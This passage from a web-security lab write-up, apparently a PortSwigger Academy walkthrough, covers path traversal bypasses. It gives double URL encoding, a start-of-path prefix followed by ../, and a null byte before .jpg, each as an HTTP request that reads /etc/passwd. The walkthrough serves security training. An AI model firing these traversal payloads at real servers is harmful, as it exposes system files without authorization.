+</pre></div>
+</div>
+<p>You see that each <code class="docutils literal notranslate"><span class="pre">.</span></code> becomes <code class="docutils literal notranslate"><span class="pre">%2e</span></code> and each <code class="docutils literal notranslate"><span class="pre">/</span></code> becomes <code class="docutils literal notranslate"><span class="pre">%2f</span></code>. But this didn’t work. I then tried <em>double</em> URL encoding the path as shown below, which <strong>did</strong> work.</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1
+</pre></div>
+</div>
+<p>The problem or <em>bug</em> in this application is that they called a “safe” function (URL-decode) twice… once prior to checking for path traversal issues (a good thing) but a second time <em>after</em> checking for path traversal issues. This could almost be considered a TOCTOU type bug.</p>
+</section>
+<hr class="docutils" />
+<section id="file-path-traversal-validation-of-start-of-path">
+<h2>File path traversal, validation of start of path<a class="headerlink" href="#file-path-traversal-validation-of-start-of-path" title="Permalink to this headline">#</a></h2>
+<div class="admonition-question admonition">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.</p>
+<p>To solve the lab, retrieve the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</div>
+<p>Within the HTTP request log, I found a request that looks like this:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=/var/www/images/47.jpg HTTP/1.1
+</pre></div>
+</div>
+<p>I modified it as follows:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+</pre></div>
+</div>
+<p>After submission, I was presented the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</section>
+<hr class="docutils" />
+<section id="file-path-traversal-validation-of-file-extension-with-null-byte-bypass">
+<h2>File path traversal, validation of file extension with null byte bypass<a class="headerlink" href="#file-path-traversal-validation-of-file-extension-with-null-byte-bypass" title="Permalink to this headline">#</a></h2>
+<div class="admonition-question admonition">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application validates that the supplied filename ends with the expected file extension.</p>
+<p>To solve the lab, retrieve the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</div>
+<p>If you take the time to <a class="reference external" href="https://portswigger.net/web-security/file-path-traversal">read the documentation</a> on this type of issue, the solution becomes quite straight forward. The following <code class="docutils literal notranslate"><span class="pre">GET</span></code> request does the trick:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+</pre></div>
+</div>
+</section>
+</section>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./ctf/ps"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            </main>
+            <footer class="footer-article noprint">
+                
+    <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+    <a class='left-prev' id="prev-link" href="ssrf.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">Server-Side Request Forgery (SSRF)</p>
+        </div>
+    </a>
+    <a class='right-next' id="next-link" href="auth.html" title="next page">
+    <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">Authentication</p>
+    </div>
+    <i class="fas fa-angle-right"></i>
+    </a>
+</div>
+            </footer>
+        </div>
+    </div>
+    <div class="footer-content row">
+        <footer class="col footer"><p>
+  
+    By Rob Gillen<br/>
+  
+      &copy; Copyright 2022.<br/>
+</p>
+        </footer>
+    </div>
+    
+</div>
+
+
+      </div>
+    </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf"></script>
+
+
+  </body>
+</html>
